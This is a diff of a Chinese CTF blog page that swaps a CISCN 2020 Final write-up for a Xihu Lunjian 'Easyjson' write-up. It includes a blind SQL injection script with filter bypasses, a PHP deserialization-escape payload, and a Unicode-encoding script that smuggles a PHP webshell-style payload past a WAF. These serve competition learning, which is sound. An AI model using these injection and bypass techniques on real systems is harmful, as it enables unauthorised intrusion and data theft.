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</code></pre><ul>
+<li>解码发现存在<code>Salted</code>的头，应该就是openssl加密的或者AES加密的。密码应该就是apache</li>
+</ul>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-090747@2x.png" alt="WX20201009-090747@2x"></p>
+<ul>
+<li>得到结果是0101，长度是4900，开平方正好是70×70,应该是一个二维码。</li>
+</ul>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-092252@2x.png" alt="WX20201009-092252@2x"></p>
+<ul>
+<li>写个小脚本生成一下</li>
+</ul>
+<pre><code class="python">from PIL import Image
+img = Image.new(&#39;RGB&#39;,(70,70),(0,0,0))
+table = [[0]*70]*70
+flag=0
+f = open(&#39;misc1.txt&#39;,&#39;r&#39;)
+string=&quot;&quot;
+flag2=0
+for i in f:
+    string=string+i
+for i in table:
+    flag2=flag2+1
+    for j in range(0,70):
+        if string[flag]==&#39;1&#39;:
+            img.putpixel((int(flag2)-1,int(j)),(255,255,255))
+        flag=flag+1
+
+
+img.show()
+f.close()
+</code></pre>
+<p><img src="https://goodcheerleung.gitee.io/macpic/tmpx4rn2w9s.png" alt="tmpx4rn2w9s"></p>
 
       
     </div>
@@ -1046,7 +1191,7 @@ main(&#39;&lt;?=phpinfo()?&gt;&#39;);
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/159ab5557e.html">
+    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d611bed02b.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/header.jpg">
@@ -1060,7 +1205,7 @@ main(&#39;&lt;?=phpinfo()?&gt;&#39;);
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/articles/159ab5557e.html" class="post-title-link" itemprop="url">CISCN 2020 FINAL 部分Write Up</a>
+            <a href="/articles/d611bed02b.html" class="post-title-link" itemprop="url">西湖论剑Easyjson Write up</a>
         </h2>
 
         <div class="post-meta">
@@ -1077,7 +1222,7 @@ main(&#39;&lt;?=phpinfo()?&gt;&#39;);
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-10-14 17:05:08" itemprop="dateModified" datetime="2020-10-14T17:05:08+08:00">2020-10-14</time>
+                <time title="修改时间：2020-10-14 17:04:36" itemprop="dateModified" datetime="2020-10-14T17:04:36+08:00">2020-10-14</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -1085,7 +1230,7 @@ main(&#39;&lt;?=phpinfo()?&gt;&#39;);
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/全国大学生信息安全竞赛/" itemprop="url" rel="index"><span itemprop="name">全国大学生信息安全竞赛</span></a>
+                  <a href="/categories/CTF比赛/" itemprop="url" rel="index"><span itemprop="name">CTF比赛</span></a>
                 </span>
             </span>
 
@@ -1095,14 +1240,14 @@ main(&#39;&lt;?=phpinfo()?&gt;&#39;);
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>10k</span>
+              <span>3.6k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>9 分钟</span>
+              <span>3 分钟</span>
             </span>
 
         </div>
@@ -1114,144 +1259,142 @@ main(&#39;&lt;?=phpinfo()?&gt;&#39;);
     <div class="post-body" itemprop="articleBody">
 
       
-          <h2 id="WEB1"><a href="#WEB1" class="headerlink" title="WEB1"></a>WEB1</h2><ul>
-<li>右键看源码有提示：SQL语句中两个变量可以控制。</li>
-<li>同时可以得知真正的flag在<code>real_flag</code>的<code>flag</code>字段中</li>
+          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
+<p>太菜了只做了一道</p>
+</blockquote>
+<h2 id="Easyjson"><a href="#Easyjson" class="headerlink" title="Easyjson"></a>Easyjson</h2><ul>
+<li>代码审计</li>
 </ul>
-<p><img src="http://goodcheerleung.gitee.io/blog/ciscn_final_1.png" alt="ciscn_final_1"></p>
-<ul>
-<li>手动fuzz发现两边过滤的字符是不一样的。过滤了很多，在测试时候发现select语句是没有被过滤的，但是union是被过滤了。</li>
-<li>id能用的有减号、<code>/*</code>、<code>or</code></li>
-<li>limit能用的有括弧、<code>*/</code></li>
-<li>这就很明显了。/**/正好可以注释掉limit</li>
-<li>然后用select查询出flag，将flag切片转换为aiisc码，然后用数字与之相减，如果相减得到0那就是Ture</li>
-<li>先构造大概原理的伪代码</li>
-</ul>
-<pre><code class="sql">SELECT * FROM fake_flag WHERE id = 3 or 102-/* limit 0,1*/ ord(mid((select group_concat(flag)from real_flag),1,1))</code></pre>
-<ul>
-<li><p>这里有个问题就是过滤了空格。</p>
-</li>
-<li><p>空格可以直接用<code>\t</code>来代替</p>
-</li>
-<li><p>功能逗号被过滤用<code>from....for</code>来代替</p>
-</li>
-</ul>
-<pre><code class="sql">SELECT * FROM fake_flag WHERE id = 3 or 102- /* limit 0,1*/ord(mid((select group_concat(flag)from real_flag)from(1)for(1)))</code></pre>
-<ul>
-<li>脚本</li>
-</ul>
-<pre><code class="python">import requests
+<pre><code class="php"> &lt;?php
+include &#39;security.php&#39;;
 
-flag = &quot;&quot;
-url = &quot;http://www.ctf.com/&quot;
-tables = r&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789{}_-&quot;
-for j in range(1,40):
-    for i in tables:
-        payload=&quot;?id=3%%09or%%09%d-/*&amp;limit=10%%09and*/ord(mid((select%%09group_concat(flag)%%09from%%09real_flag)from(%d)for(1)))&quot;%(ord(i),j)
-        #print(payload)
-        r = requests.get(url+payload)
-        if &quot;searched nothing&quot; in r.text:
-            flag=flag+i
-            print(flag)
-            break</code></pre>
-<p><img src="http://goodcheerleung.gitee.io/blog/ciscn_final_2.png" alt="ciscn_final_2"></p>
-<h2 id="Web3"><a href="#Web3" class="headerlink" title="Web3"></a>Web3</h2><ul>
-<li>国际惯例扫描一下，得到备份源码</li>
-</ul>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201007-210800@2x.png" alt="WX20201007-210800@2x"></p>
+if(!isset($_GET[&#39;source&#39;])){
+    show_source(__FILE__);
+    die();
+}
+$sandbox = &#39;sandbox/&#39;.sha1($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]).&#39;/&#39;;
+var_dump($sandbox);
+if(!file_exists($sandbox)){
+    mkdir($sandbox);
+    file_put_contents($sandbox.&quot;index.php&quot;,&quot;&lt;?php echo &#39;Welcome To Dbapp OSS.&#39;;?&gt;&quot;);
+}
+$action = $_GET[&#39;action&#39;];
+$content = file_get_contents(&quot;php://input&quot;);
+
+
+if($action == &quot;write&quot; &amp;&amp;  SecurityCheck(&#39;filename&#39;,$_GET[&#39;filename&#39;]) &amp;&amp;SecurityCheck(&#39;content&#39;,$content)){
+    $content = json_decode($content);
+    $filename = $_GET[&#39;filename&#39;];
+    $filecontent = $content-&gt;content;
+    $filename = $sandbox.$filename;
+    file_put_contents($filename,$filecontent.&quot;\n Powered By Dbapp OSS.&quot;);
+}elseif($action == &quot;reset&quot;){
+    $files = scandir($sandbox);
+    foreach($files as $file) {
+        if(!is_dir($file)){
+            if($file !== &quot;index.php&quot;){
+                unlink($sandbox.$file);
+            }
+        }
+    }
+}
+else{
+    die(&#39;Security Check Failed.&#39;);
+}
+</code></pre>
 <ul>
-<li>简单看一下源码，在<code>lib.php</code>存在一个反序列化点。</li>
+<li>代码主要部分在,但是这里有一个waf对文件名和content参数进行过滤。简单Fuzz了一下，filename可以使用php后缀，说明可以写php文件，但是有一个很关键的问题就是<code>content</code>它传来必须是一个json,json中有一个属性是content，例如：<code>{&#39;content&#39;:&#39;&lt;?=phpinfo()?&gt;&#39;}</code>但是<code>waf</code>对json进行了过滤，不能存在content这个字符串(还过滤了其他关键字)。</li>
 </ul>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201005-205532@2x.png" alt="WX20201005-205532@2x"></p>
+<pre><code class="php">if($action == &quot;write&quot; &amp;&amp;  SecurityCheck(&#39;filename&#39;,$_GET[&#39;filename&#39;]) &amp;&amp;SecurityCheck(&#39;content&#39;,$content)){
+    $content = json_decode($content);
+    $filename = $_GET[&#39;filename&#39;];
+    $filecontent = $content-&gt;content;
+    $filename = $sandbox.$filename;
+    file_put_contents($filename,$filecontent.&quot;\n Powered By Dbapp OSS.&quot;);
+}</code></pre>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-001234@2x.png" alt="WX20201009-001234@2x"></p>
 <ul>
-<li>全局搜索<code>update</code>查看哪里使用了这个方法，可以发现在<code>dashboard.php</code>存在调用<code>update</code>的情况。但是这里先是奖传入的内容赋值给一个数组，然后再进行序列化，传入一个<code>waf</code>对传入的内容进行了替换。但是waf是将部分关键字进行替换，这里可以基本确定是考察反序列化的字符逃逸问题。</li>
+<li>神小密圈发现，json支持的字符中可以支持unicode编码，那么我们全都用unicode编码来代替字符串不就行了？</li>
 </ul>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201005-205428@2x.png" alt="WX20201005-205428@2x"></p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WechatIMG59.jpeg" alt="WechatIMG59"></p>
 <ul>
-<li>从源码可以知道flag就是在<code>flag.php</code>我们的目标就是读到<code>flag.php</code>源码即可。整个类最明显调用的地方就是<code>_DESTRUCT()</code>可以读取文件。</li>
+<li>简单测试一下发现可以.<a href="https://blog.csdn.net/weixin_30654419/article/details/97554779?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.channel_param&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.channel_param" target="_blank" rel="noopener">Unicode表</a></li>
 </ul>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201005-210603@2x.png" alt="WX20201005-210603@2x"></p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WechatIMG72.png" alt="WechatIMG72"></p>
 <ul>
-<li>这样目标就很明显了，我们需要控制<code>avatar</code>属性为<code>flag.php</code>,但是这里存在一个问题，就是waf是过滤了<code>flag</code>这个关键字，我们知道在遇到私有属性可以将小s改成S通过十六进制来代替不可见字符，同样我们可以通过十六进制来表示<code>flag.php</code>，这样就能轻松绕过waf的过滤，但是waf还有一个用处就是用来字符逃逸</li>
+<li>简单写个脚本来将字符串转化为unicode编码。</li>
 </ul>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201005-213527@2x.png" alt="WX20201005-213433@2x"></p>
+<pre><code class="php">&lt;?php
+
+function unicode_encode($str){
+    $table = [
+            &#39;\u002&#39;=&gt;[&#39; &#39;,&#39;!&#39;,&#39;&quot;&#39;,&#39;#&#39;,&#39;$&#39;,&#39;%&#39;,&#39;&amp;&#39;,&#39;\&#39;&#39;,&#39;(&#39;,&#39;)&#39;,&#39;*&#39;,&#39;+&#39;,&#39;,&#39;,&#39;-&#39;,&#39;.&#39;,&#39;/&#39;],
+            &#39;\u003&#39;=&gt;[&#39;0&#39;,&#39;1&#39;,&#39;2&#39;,&#39;3&#39;,&#39;4&#39;,&#39;5&#39;,&#39;6&#39;,&#39;7&#39;,&#39;8&#39;,&#39;9&#39;,&#39;:&#39;,&#39;;&#39;,&#39;&lt;&#39;,&#39;=&#39;,&#39;&gt;&#39;,&#39;?&#39;],
+            &#39;\u004&#39;=&gt;[&#39;@&#39;,&#39;A&#39;,&#39;B&#39;,&#39;C&#39;,&#39;D&#39;,&#39;E&#39;,&#39;F&#39;,&#39;G&#39;,&#39;H&#39;,&#39;I&#39;,&#39;J&#39;,&#39;K&#39;,&#39;L&#39;,&#39;M&#39;,&#39;N&#39;,&#39;O&#39;],
+            &#39;\u005&#39;=&gt;[&#39;P&#39;,&#39;Q&#39;,&#39;R&#39;,&#39;S&#39;,&#39;T&#39;,&#39;U&#39;,&#39;V&#39;,&#39;W&#39;,&#39;X&#39;,&#39;Y&#39;,&#39;Z&#39;,&#39;[&#39;,&#39;\\&#39;,&#39;]&#39;,&#39;^&#39;,&#39;_&#39;],
+            &#39;\u006&#39;=&gt;[&#39;`&#39;,&#39;a&#39;,&#39;b&#39;,&#39;c&#39;,&#39;d&#39;,&#39;e&#39;,&#39;f&#39;,&#39;g&#39;,&#39;h&#39;,&#39;i&#39;,&#39;j&#39;,&#39;k&#39;,&#39;l&#39;,&#39;m&#39;,&#39;n&#39;,&#39;o&#39;],
+            &#39;\u007&#39;=&gt;[&#39;p&#39;,&#39;q&#39;,&#39;r&#39;,&#39;s&#39;,&#39;t&#39;,&#39;u&#39;,&#39;v&#39;,&#39;w&#39;,&#39;x&#39;,&#39;y&#39;,&#39;z&#39;,&#39;{&#39;,&#39;|&#39;,&#39;}&#39;,&#39;~&#39;]
+];
+    foreach ($table as $key =&gt; $value) {
+        $i = 0;
+        foreach ($value as $vcode) {
+            $i=$i+1;
+            if($str==$vcode){
+                return $key.bin2e($i-1);
+            }
+
+        }
+    }
+
+}
+
+function bin2e($str){
+    switch ($str) {
+        case &#39;10&#39;:
+            return &#39;a&#39;;
+            break;
+        case &#39;11&#39;:
+            return &#39;b&#39;;
+            break;
+        case &#39;12&#39;:
+            return &#39;c&#39;;
+            break;
+        case &#39;13&#39;:
+            return &#39;d&#39;;
+            break;
+        case &#39;14&#39;:
+            return &#39;e&#39;;
+            break;
+        case &#39;15&#39;:
+            return &#39;f&#39;;
+            break;
+        default:
+            return $str;
+            break;
+    }
+}
+
+function main($str){
+for($i=0;$i&lt;strlen($str);$i++){
+    echo unicode_encode($str[$i]);
+}
+}
+
+
+main(&#39;&lt;?=phpinfo()?&gt;&#39;);
+?&gt;</code></pre>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-000458@2x.png" alt="WX20201009-000458@2x"></p>
 <ul>
-<li>waf可以将flag替换为index,这样我们替换一个flag能够逃逸一个字符。</li>
+<li>EXP</li>
 </ul>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201007-205541@2x.png" alt="WX20201007-205541@2x"></p>
-<ul>
-<li>由于我们能够控制的是序列化后的一个数组，所以我们要逃逸的是这么一个对象,<code>&quot;;s:1:&quot;1&quot;;</code>单引号是为了闭合前面制造逃逸的字符串，<code>;s:1:&quot;1&quot;;</code>是为了给数组增加一个元素，他的值是一个对象。</li>
-</ul>
-<pre><code class="php">&quot;;s:1:&quot;1&quot;;O:4:&quot;User&quot;:6:{S:8:&quot;username&quot;;S:1:&quot;1&quot;;S:8:&quot;password&quot;;S:1:&quot;1&quot;;S:3:&quot;age&quot;;S:1:&quot;1&quot;;S:5:&quot;email&quot;;S:1:&quot;1&quot;;S:12:&quot;\00User\00avatar&quot;;S:8:&quot;\66\6C\61\67\2E\70\68\70&quot;;S:13:&quot;\00User\00content&quot;;S:0:&quot;&quot;;}</code></pre>
-<ul>
-<li>而上面的字符串长度为196，所以我们需要196个flag来制造逃逸。</li>
-</ul>
-<pre><code class="php">flagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflag&quot;;s:1:&quot;1&quot;;O:4:&quot;User&quot;:6:{S:8:&quot;username&quot;;S:1:&quot;1&quot;;S:8:&quot;password&quot;;S:1:&quot;1&quot;;S:3:&quot;age&quot;;S:1:&quot;1&quot;;S:5:&quot;email&quot;;S:1:&quot;1&quot;;S:12:&quot;\00User\00avatar&quot;;S:8:&quot;\66\6C\61\67\2E\70\68\70&quot;;S:13:&quot;\00User\00content&quot;;S:0:&quot;&quot;;}</code></pre>
-<ul>
-<li>这里有一个问题就是我们只能用<code>old_password</code>来逃逸，因为<code>dashboard.php</code>对其他参数进行了过滤，但是<code>old_password</code>没有进行过滤。</li>
-</ul>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201007-210152@2x.png" alt="WX20201007-210152@2x"></p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-000600@2x.png" alt="WX20201009-000600@2x"></p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-000806@2x.png" alt="WX20201009-000806@2x"></p>
 <ul>
 <li>Getflag</li>
 </ul>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201007-211522@2x.png" alt="WX20201007-211522@2x"></p>
-<h2 id="MISC1"><a href="#MISC1" class="headerlink" title="MISC1"></a>MISC1</h2><ul>
-<li>题目给了一张损坏了的PNG图片，在第八个chunk，length长度为0，所以要计算chunk[8]的长度。</li>
-</ul>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-085749@2x.png" alt="WX20201009-085749@2x"></p>
-<ul>
-<li>Chunk的长度是这个CHUNK IDAT到下一个IDAT的长度。</li>
-</ul>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-090038@2x.png" alt="WX20201009-090038@2x"></p>
-<ul>
-<li>CP下来，写个脚本计算一下长度。</li>
-</ul>
-<pre><code class="php">&lt;?php
-$a = file_get_contents(&#39;1.txt&#39;);
-echo strlen($a);
-?&gt;</code></pre>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-090153@2x.png" alt="WX20201009-090153@2x"></p>
-<ul>
-<li>修改长度为<code>21543</code>,这样就可以将图片修复为正常的图片，得到hint，apache</li>
-</ul>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-090304@2x.png" alt="WX20201009-090304@2x"></p>
-<p><img src="https://goodcheerleung.gitee.io/macpic/misc.png" alt="misc"></p>
-<ul>
-<li>在010编辑时候就发现，在图片的后面存在一串类似base64的东西。用万能的<code>strings</code>提取出来,去掉IDAT头</li>
-</ul>
-<pre><code>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